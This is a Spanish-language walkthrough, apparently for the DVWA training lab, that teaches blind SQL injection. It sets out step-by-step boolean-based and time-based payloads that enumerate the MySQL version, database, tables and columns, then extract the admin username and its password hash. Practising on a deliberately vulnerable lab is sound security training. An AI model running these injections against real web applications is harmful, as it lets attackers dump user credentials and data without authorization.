# Blind SQLi

El SQLi Blind se considera un ataque a ciegas, es decir, no tenemos errores ni información por parte del servidor. Se pueden dar dos casos:

* **Boolean-based Blind**: donde obtenemos respuestas True/False en función del resultado de la consulta SQL. Dichos cambios son visibles en la página.
* **Time-based blind**: sin cambio para la salida de la condición True/False, basándose en el tiempo de respuesta.

## Boolean-based Blind

En la primera prueba nos encontramos con un input que si introduces un ID de usuario válido te dice si existe o no. Con esta lógica, tenemos que crear consultas que nos devuelvan True/False para ir adivinando la información que hay en la base de datos.

![](<../.gitbook/assets/1 (20).png>)

![](<../.gitbook/assets/2 (3).png>)

Como vemos en la primera prueba, que 1=1 nos devuelve un True al existir la igualdad y pasa lo contrario cuando hacemos 1=2.

![](<../.gitbook/assets/4 (5).png>)

![](<../.gitbook/assets/3 (16).png>)

Vamos a ver los diferentes comandos para poder hacer una Blind manualmente, aunque para estos casos es recomendable usar herramientas tipo [SQLMAP](https://sqlmap.org/) por el ahorro de tiempo. (No se van a poner capturas por su mala lectura de código).

Obtenemos la versión de MySQL; en este caso, la versión del servidor es 5, por lo que la segunda consulta nos devuelve True:

```sql
1' AND substring(version(),1,1)=4# Version 4 False
1' AND substring(version(),1,1)=5# Version 5 True
```

Para obtener las siguientes partes de la versión, tenemos que ir desplazando el SUBSTRING, aumentando el primer parámetro:

```sql
1' AND substring(version(),2,1)="."#
1' AND substring(version(),3,1)=5#
```

Lo siguiente que necesitamos es saber las tablas y columnas, por lo que necesitamos saber si tiene soporte para subquery:

```sql
1' AND (select 1)=1#
```

Una vez que disponemos de subquery, vamos a averiguar el tamaño del nombre de la base de datos de la tabla que está usando el SELECT, viendo que el nombre de la base de datos es 4.

```sql
1' AND (SELECT LENGTH(database()))=1# False
1' AND (SELECT LENGTH(database()))=2# False
1' AND (SELECT LENGTH(database()))=3# False
1' AND (SELECT LENGTH(database()))=4# True
```

Teniendo su tamaño, queremos obtener el nombre de la base de datos. Para ello, usamos la función ASCII de MySQL para convertir el valor del SUBSTRING a número [ASCII](https://www.rapidtables.com/code/text/ascii-table.html), más fácil de comparar. Empezamos en el primer carácter en minúsculas, que es el 97, y vamos subiendo el valor hasta obtener un False. El primer False es el carácter que buscamos.

```sql
1' AND (SELECT ASCII(SUBSTRING(database(), 1, 1)))>97# True
1' AND (SELECT ASCII(SUBSTRING(database(), 1, 1)))>98# True
1' AND (SELECT ASCII(SUBSTRING(database(), 1, 1)))>99# True
1' AND (SELECT ASCII(SUBSTRING(database(), 1, 1)))>100# False
```

Por lo que obtenemos que la primera letra es la "d". Seguimos con la siguiente letra y, como en la versión, cambiamos la posición del substring y comenzamos la búsqueda.

```sql
1' AND (SELECT ASCII(SUBSTRING(database(), 2, 1)))>97# True
.....
1' AND (SELECT ASCII(SUBSTRING(database(), 2, 1)))>116# True
1' AND (SELECT ASCII(SUBSTRING(database(), 2, 1)))>117# True
1' AND (SELECT ASCII(SUBSTRING(database(), 2, 1)))>118# False
```

Ya tenemos nuestra "v". Ahora nos quedaría repetir estos pasos hasta finalizar todos los caracteres. Como en el ejemplo anterior de SQL, ahora necesitamos saber la cantidad de tablas que tiene y sus nombres, por lo que empezamos contando cuántas tablas tiene la base de datos.

```sql
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=1# False
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=2# True
```

Ahora que sabemos cuántas tablas tenemos, podemos obtener sus nombres. Pero antes, tenemos que saber la longitud de los nombres. Para acceder a las diferentes tablas, lo hacemos con LIMIT según el siguiente ejemplo:

```sql
SELECT * FROM table_name LIMIT 0,1
// Seleccionamos solo la primera tabla

SELECT * FROM table_name LIMIT 1,1
// Seleccionamos solo la segunda tabla

SELECT * FROM table_name LIMIT 0,2
// Seleccionamos la primera y segunda tabla

SELECT * FROM table_name LIMIT 1,2
// Seleccionamos la segunda y tercera tabla
```

Repetimos el proceso de ir contando hasta dar con el número total de caracteres:

```sql
1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=1# False
....
1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=9# True


1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)=1# False
...
1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)=5# True
```

Para obtener el nombre de la tabla, podemos usar las funciones ASCII y SUBSTRING de antes o usar LIKE, como vamos a ver a continuación:

```sql
1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1) LIKE 'a%'# False
...
1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1) LIKE 'u%'# True
```

Vamos repitiendo con las siguientes letras hasta completar las 5 que hemos obtenido en el paso anterior:

```sql
1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1) LIKE 'users'#
```

Vamos a obtener el número de columnas que tiene la tabla y después su longitud:

```sql
1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users')=1# False
..
1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users')=8# True
```

Ahora que sabemos cuántas columnas tiene la tabla "users", vamos a determinar la longitud de cada columna:

```sql
1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1)=1# False
...
1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1)=7# True
```

Tendremos que repetir este proceso para todas las columnas, aumentando el límite como ya hicimos antes.

Cuando tenemos las columnas y sus longitudes, ya podemos empezar a recorrerlas hasta obtener los nombres. Podemos hacerlo con las funciones ASCII y SUBSTRING o con LIKE:

```sql
1' AND (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 3,1) LIKE 'u%'# True
...
1' AND (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 3,1) LIKE 'user%'# True
```

Ahora que ya tenemos toda la estructura de la base de datos, tenemos que extraer los datos. Así que volvemos a repetir el mismo procedimiento:

* dvwa
  * gestbook
  * users
    * user
    * password

Para obtener el total de usuarios disponibles, contamos el total de filas:

```sql
1 ' AND (SELECT count(user) FROM users)=1# False
...
1 ' AND (SELECT count(user) FROM users)=5# True
```

Recuperamos el tamaño del primer usuario:

```sql
1' AND (SELECT LENGTH(user) FROM users LIMIT 1)=1# False
...
1' AND (SELECT LENGTH(user) FROM users LIMIT 1)=5# True
```

Recuperamos el tamaño del password del primer usuario:

```sql
1' AND (SELECT LENGTH(password) FROM users LIMIT 1)=1# False
...
1' AND (SELECT LENGTH(password) FROM users LIMIT 1)=32# True
```

Para recuperar el resto de los usuarios, vamos jugando con LIMIT como hemos estado haciendo hasta ahora. Para finalizar, ya solo nos queda obtener los datos de esos dos campos.

Recuperamos el usuario:

```sql
1' AND (SELECT user FROM users LIMIT 1) LIKE 'a%'# True
...
1' AND (SELECT user FROM users LIMIT 1) LIKE 'admin%'# True
```

Recuperamos el password:

```sql
1' AND (SELECT password FROM users LIMIT 1) LIKE '5%'# True
...
1' AND (SELECT password FROM users LIMIT 1) LIKE '5f4dcc3b5aa765d61d8327deb882cf99%'# True
```

## Time-based Blind

En DVWA podemos resolver los tres niveles con Boolean-based Blind, pero vamos a hacer unos pequeños ejemplos de cómo hacer Time-based Blind. Para esto, tenemos que usar el tiempo y comprobar mediante un IF si el tiempo de retardo es el marcado en BENCHMARK es igual para ver si son True o False.

Obtener la versión de la base de datos:

```sql
1' UNION SELECT IF(SUBSTRING(version(),1,1)=4,BENCHMARK(5000000,MD5(CHAR(1))),null),null# False
...
1' UNION SELECT IF(SUBSTRING(version(),1,1)=5,BENCHMARK(5000000,MD5(CHAR(1))),null),null# True
```

Tamaño del nombre de la base de datos:

```sql
1' UNION SELECT IF(((SELECT LENGTH(database()))=1),BENCHMARK(5000000,MD5(CHAR(1))),null),null# True
...
1' UNION SELECT IF(((SELECT LENGTH(database()))=4),BENCHMARK(5000000,MD5(CHAR(1))),null),null# True
```

Tendríamos que repetir todo el proceso que hemos realizado con la otra blind, pero además de ir contando verdadero o falso, hay que esperar el tiempo que le pongamos a BENCHMARK. Por lo tanto, es un proceso muy largo y costoso, y en estos casos, es preferible usar una herramienta como SQLMAP si es posible.

## Medio-Alto

Los ejercicios de nivel medio y difícil se resuelven con sqlmap exactamente igual que los anteriores o a mano realizando todo el proceso que acabamos de ver. Sin embargo, es importante tener en cuenta que el tiempo requerido para completar estos ataques de forma manual puede ser considerablemente largo. Por lo tanto, la utilización de herramientas automatizadas como SQLMAP puede ser una opción más eficiente y efectiva en estos casos.
